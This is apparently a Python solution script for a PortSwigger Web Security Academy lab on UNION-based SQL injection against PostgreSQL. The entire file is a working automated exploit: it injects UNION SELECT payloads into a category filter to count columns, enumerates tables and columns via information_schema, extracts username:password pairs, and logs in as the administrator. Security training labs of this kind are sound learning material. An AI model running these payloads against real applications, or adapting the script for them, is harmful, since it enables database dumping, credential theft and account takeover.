import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
from random import randint

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
# db: PostgreSQL
# author: 0xyf


class SQLi10:
    def __init__(self):
        self.lab_id = "0ad9000e037c8a09848a7e63004c0082"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.login_url = f"{self.url}/login"
        self.vuln_url = f"{self.url}/filter"
        self.proxies = {"https": "http://127.0.0.1:8080"}
        self.get_csrf_token()

    def get_csrf_token(self):
        r = requests.get(f"{self.login_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def execute_request(self, payload):
        params = {"category": payload}
        r = requests.get(
            f"{self.vuln_url}", params=params, proxies=self.proxies, verify=False
        )
        return r

    def get_no_of_col(self):
        base_payload = "'UNION SELECT "
        for i in range(1, 10):
            null_values = ", ".join(["NULL"] * i)
            final_payload = f"{base_payload}{null_values}--"
            r = self.execute_request(final_payload)
            if r.status_code == 200:
                self.col_no = final_payload.count("NULL")
                print(f"[*] no. of col: {self.col_no}")
                break

    def get_reflected_col(self):
        random_no_lst = [str(randint(100, 999)) for _ in range(self.col_no)]
        payload = f"'UNION SELECT {','.join(f"'{no}'" for no in random_no_lst)}"
        self.random_no_lst = random_no_lst
        self.base_payload = (
            payload  # this becomes the base payload for future injections
        )
        payload += "-- -"  # add comment to the back
        r = self.execute_request(payload)
        if r.status_code == 200:
            for no in random_no_lst:
                if no in r.text:
                    self.reflected_no = no
                    print(f"[*] {no} is reflected")

    def get_tables(self):
        # payload = "'UNION SELECT TABLE_NAME,'4127' FROM information_schema.TABLES-- -"
        payload = self.base_payload.replace(f"'{self.reflected_no}'", "TABLE_NAME")
        payload += " FROM information_schema.TABLES-- -"
        r = self.execute_request(payload)
        if r.status_code == 200:
            tables = self.parse(r)
            self.table = [x for x in tables if "users" in x][
                0
            ]  # Look for tables with the word 'users' in them, index 0 is the user table
            print(f"[*] user table: {self.table}")

    def get_columns(self):
        payload = self.base_payload.replace(f"'{self.reflected_no}'", "COLUMN_NAME")
        payload += (
            f" FROM information_schema.COLUMNS WHERE table_name='{self.table}'-- -"
        )
        r = self.execute_request(payload)
        if r.status_code == 200:
            columns = self.parse(r)
            self.password_col, self.username_col, self.email_col = columns
            print(f"[*] columns: {columns}")

    def get_creds(self):
        payload = self.base_payload.replace(
            f"'{self.reflected_no}'",
            f"CONCAT({self.username_col}, ':', {self.password_col})",
        )
        payload += " FROM users-- -"
        r = self.execute_request(payload)
        if r.status_code == 200:
            creds = self.parse(r)
            admin_creds = [x for x in creds if "admin" in x][0]
            self.username, self.password = admin_creds.split(":")
            print(f"[*] creds: {self.username}:{self.password}")

    def login(self):
        print(f"[*] Attempting to Login as {self.username}:{self.password}")
        data = {
            "username": self.username,
            "password": self.password,
            "csrf": self.csrf_token,
        }
        r = requests.post(
            self.login_url,
            cookies=self.cookies,
            data=data,
            proxies=self.proxies,
            verify=False,
        )

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.get_no_of_col()
        self.get_reflected_col()
        self.get_tables()
        self.get_columns()
        self.get_creds()
        self.login()
        self.check_solved()

    @staticmethod
    def parse(r):
        soup = BeautifulSoup(r.text, "html.parser")
        table = soup.find("table")
        table_headers = [header.text.strip() for header in table.find_all("th")]
        return table_headers


def main():
    SQLi10().solve()


if __name__ == "__main__":
    main()
